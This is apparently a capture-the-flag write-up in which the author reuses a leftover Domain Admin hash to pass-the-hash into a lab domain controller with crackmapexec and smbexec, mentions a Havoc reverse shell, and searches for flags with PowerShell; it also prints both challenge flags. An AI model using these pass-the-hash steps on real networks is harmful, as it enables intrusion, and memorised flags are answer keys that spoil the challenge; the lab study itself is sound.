### Challenge description
FullPwn challenges don't have a description. We just get an IP address and are supposed to get user and root flag.

Because [Contempt](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33) had the unintended vulnerability with Zerologon, HTB created this challenge. I got both user AND root flags for this challenge via unintended means as well.

We are dealing with the same Domain Controller. Because of this, the first thing I did was to check all the users and their hashes. Surprisingly, not all of them were changed and one of Domain Admins' hash still worked:

```bash
crackmapexec smb contempt.htb -u echo.rivers -H a7be11b5be8bb84196edbd0e8c0bc9ea --shares
```
![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

We get access again via smbexec and NETLOGON share:

```bash
smbexec.py contemp.htb/echo.rivers@contempt.htb -hashes :a7be11b5be8bb84196edbd0e8c0bc9ea -share NETLOGON
```
![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

And get the administrator flag right away:

HTB{HeY_iv3_g0n3_phIsHINg_leav3_4_meSs4g3}

### Privilege de-escalation... again

I repeated the step from Contempt and got a reverse shell in Havoc and ran the recursive search for pattern:

```powershell
shell powershell -command "ls -fo -r \ -erroraction silentlycontinue | sls -pattern 'HTB{' -erroraction silentlycontinue"
```
![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

And we get the user flag as well as the older flag from Contempt:
![image](../../../../../../30-archetypes/archives/personal-collections/CTF-Writeups-LazyTitan33)

HTB{1_nEveR_cL41m3D_t0_Be_4n_ss0_exPERt}
